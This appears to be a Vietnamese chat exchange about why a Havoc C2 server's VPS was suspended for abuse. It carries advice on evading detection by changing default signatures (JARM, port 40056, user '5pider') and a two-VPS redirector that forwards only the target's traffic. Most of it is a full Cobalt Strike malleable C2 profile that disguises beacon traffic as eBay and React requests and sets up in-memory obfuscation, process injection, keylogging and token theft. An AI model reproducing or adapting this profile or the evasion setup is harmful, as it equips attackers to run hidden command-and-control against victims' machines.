chị ơi, bữa trc em setup firewall VPS em chỉ whitelist port server havoc và port listener havoc với port web nữa á chị mà vài ngày chạy là vps bị suspended do abuse luôn 
Giải thích: Lí do em bị report là không hiểu về C2, Cách thức Hoạt Động, Avoid Detection, Signatute của C2 
Cụ thể: Signature là những gì đặc trưng để trích xuất của C2 đã biết 
signature:
Trong mỗi C2 như Havoc, Cobalt Strike, MSFConsole đều luôn có signature để AV detect được. Ví dụ trong CBS bản < 3.13 sẽ có khoảng trắng từ http status response
Trong C2 như em tìm hiểu listener port là 80 và 443, bản thân nó cũng là signature.
Nguyên nhân là 443 là https = http + ssl thì cái ssl em dùng mặc định của C2 havoc nó sẽ signature của havoc, mà cả trăm nghìn case đều xài chung 1 cấu trúc như serial number, jarm, ...(Hình minh họa)
Phần https từ khóa tìm hiểu là : JARM/ Hash TLS/SSL stack
Port: Em đang lấy port mặc định của havoc là 40056
User: Em đang lấy user mặc định của havoc là 5pider
DNS Server -> Thường trong profile của sẽ bị dính đến signature.
Giải pháp: Tìm hiểu về Havoc, những signature thường bị maps với havoc (toàn bộ các phiên bản trước đó và đang dùng), từ những signature đó, đưa ra giải pháp để bypass. 


kiểu này nè "target request --> VPS1. Confirm đúng IP target, mới allow IP cho forwart tiếp đúng IP target đến VPS2 (chứa source havoc) về C2" 


Client -> VPS 1 (port 80, 443) -> forward traffic VPS1:443 , VPS2:50000 -> VPS 2 (port 50000) -> RAT




set sample_name "jQuery CS 4.8 Profile";
set sleeptime "95000";
set jitter    "35";
set data_jitter "99";

set useragent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.3 Safari/537.21";

set tasks_max_size "2623440"; # Changed to 2 MB to support larger assembly files
set tasks_proxy_max_size "921600";
set tasks_dns_proxy_max_size "239342";  

set tcp_port "26931";
set tcp_frame_header "\x49\x51\x5a\x55\x47\x55\x46\x43\x31\x58\x57";

set pipename         "PSHost.[0-9a-f]{9}.[0-9a-f]{4}.DefaultAppDomain-##";
set pipename_stager  "epmapper.[0-9a-f]{2}_##";
set smb_frame_header "\x51\x48\x30\x4d\x52\x56\x59\x38\x4a";

set host_stage "false";


https-certificate{
	set keystore "illustrate.service-mozilesftp.cloud.store";
	set password "8NSqatrtH7LuWFk8a5Ym";
}

http-stager {  
    set uri_x86 "/api/qrcode/NGJmYzZkMTUtMDc5/scan";
    set uri_x64 "/d4efd2f-5570-45d1-acec-0aa2b99bf2a7/ir.ebaystatic.com";

    server {
		header "Cache-Control" "public, max-age=0, must-revalidate";
		header "access-control-allow-origin" "*";
		header "Server" "Vercel";
		header "x-vercel-cache" "HIT";

		output{
			prepend "\x44\x59\x44\x48\x6e\x64\x50\x67\x44\x54\x72\x6b\x57\x69\x66";
			append "\x6b\x34\x55\x56\x57\x34\x4d\x38\x52\x39\x45\x70\x45\x58\x64";
			print;
		}
    }

    client {
        parameter "_t" "6145679951195";
		header "Host" "docs.react.io";
		header "Accept-Language" "en-US,en;q=0.5";
		header "Content-Lenght" "0";
    }
}


post-ex {
    set spawnto_x86 "%windir%\\syswow64\\gpresult.exe";
    set spawnto_x64 "%windir%\\sysnative\\gpresult.exe";
    set obfuscate "false";
    set smartinject "false";
    set amsi_disable "false";
    set pipename "atsvc_###-0,";
    set keylogger "GetAsyncKeyState";
}

set steal_token_access_mask "0"; # TOKEN_ALL_ACCESS

stage {
   set allocator      "VirtualAlloc"; # Options are: HeapAlloc, MapViewOfFile, and VirtualAlloc

    set magic_pe       "PE";
    set userwx         "false"; 
    set stomppe        "true";
    set obfuscate      "true";
    set cleanup        "true";
    set sleep_mask     "true";
    set smartinject    "true";

    # Make the Beacon Reflective DLL look like something else in memory
    set checksum       "0";
    set compile_time   "27 June 2015 6:13:34";
    set entry_point    "686432";
    set image_size_x86 "421000";
    set image_size_x64 "421000";
    set name           "beacon.x64.dll";
#    set rich_header    "\x47\x47\x47\x00\x47\x47\x47\x00\x47\x47\x47\x00\x47\x47\x47\x00";
	set rich_header    "\x69\x2e\x2e\x2e\x2e\x2e\x2e\x69\x64\x6f\x57\x73\x2e\x46\x58\x2e\x2e\x2e\x2e\x2e\x59\x2e\x2e\x2e\x4d\x2e\x61\x38\x32\x4a\x7c\x4e\x2e\x63\x2e\x60\x2e\x60\x2e\x2e\x56\x47\x46\x2e\x2e\x51\x2e\x2e\x7c\x2e\x5d\x2e\x47\x72\x2e\x2e\x66\x63\x56\x58\x58\x2e\x2e\x71\x2e\x4c\x2e\x2e\x46\x2e\x2e\x43\x2e\x45\x44\x2e\x66\x40\x38\x2e\x64\x69\x24\x2e\x50\x7c\x2e\x2e\x2e\x2e\x57\x49\x58\x2e\x2e\x2e\x78\x2e\x2e\x4b\x78\x4a\x77\x2e\x2e\x00\x00\x00\x00\x00\x00\x00"; 
    # CS 4.8 - Added default syscall method option. This option supports: None, Direct, and Indirect.
    set syscall_method "Direct";


    transform-x86 { 
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; 
        strrep "ReflectiveLoader" "execute"; 
        strrep "This program cannot be run in DOS mode" ""; 
        strrep "beacon.dll" "";
    }
    transform-x64 { 
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; 
        strrep "ReflectiveLoader" "execute"; 
        strrep "beacon.x64.dll" "";
    }
    
    stringw "React";
}
process-inject {

    set allocator "NtMapViewOfSection";
    set bof_allocator "VirtualAlloc"; # Options are: HeapAlloc, MapViewOfFile, and VirtualAlloc
    set bof_reuse_memory "true";
    set min_alloc "17500";
    
    set startrwx "false";
    set userwx   "false";
    
    transform-x86 {
        prepend "\x90\x90";
    }
    transform-x64 {
        prepend "\x90\x90";
    }
    execute {  
        CreateThread "ntdll!RtlUserThreadStart+0x42"; 
        CreateThread;
        NtQueueApcThread-s;     
        SetThreadContext;       
        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x42";
        RtlCreateUserThread;
    }
}


http-get {

    set uri "/ir.ebaystatic.com/cr/v/c01/ac-082924161357.dweb.min.js";

    client {

        header "Accept" "application/pdf, text/plain;q=0.9, image/jpeg;q=0.8, */*;q=0.7";
        header "Host" "www.ebay.com";
		header "Accept-Language" "en-US,en;q=0.5";
        
        metadata {
    		base64;
    		#prepend "auth-token=";
    		prepend "theme=dark;";	
    		header "Cookie";
        }
    }

    server {
		header "Server" "ebay server";
		header "Rlogid" "t6q%60uebwh%3D9vjdq%60uebwh*th2oq%28rbpv6775-1919fb83a8c-0x232e";
		header "Vary" "Accept-Encoding";
		header "x-ebay-c-version" "1.0.0";
		header "x-ebay-mesh-gw-duration" "14";
     
     	output {
	 		netbios;
			base64;
     	   	print;
    	}
     }
}

http-post {
    
    set uri "/i.ebayimg.com/images/g/qa4AAOSwHJhmzKgo/s-l500.webp";

    client {

        header "Accept" "application/pdf, text/plain;q=0.9, image/jpeg;q=0.8, */*;q=0.7";
        header "Host" "www.ebay.com";
        header "Content-Type" "text/xml";
        
        id {
            base64url;
            parameter "app_id";
        }
        
		output {
            mask;
			print;
        }
		#parameter "clienttype" "0";
    }

    server {
		header "Server" "ebay server";
		header "Vary" "Accept-Encoding";
		header "x-ebay-mesh-gw-duration" "14";
		header "x-ebay-mesh-server-duration" "12";
		header "via" "1.1 include-cache-2 (squid), 1.1 varnish";
     
     	output {
	 		netbios;
			#base64;
     	   	print;
    	}
     }
}
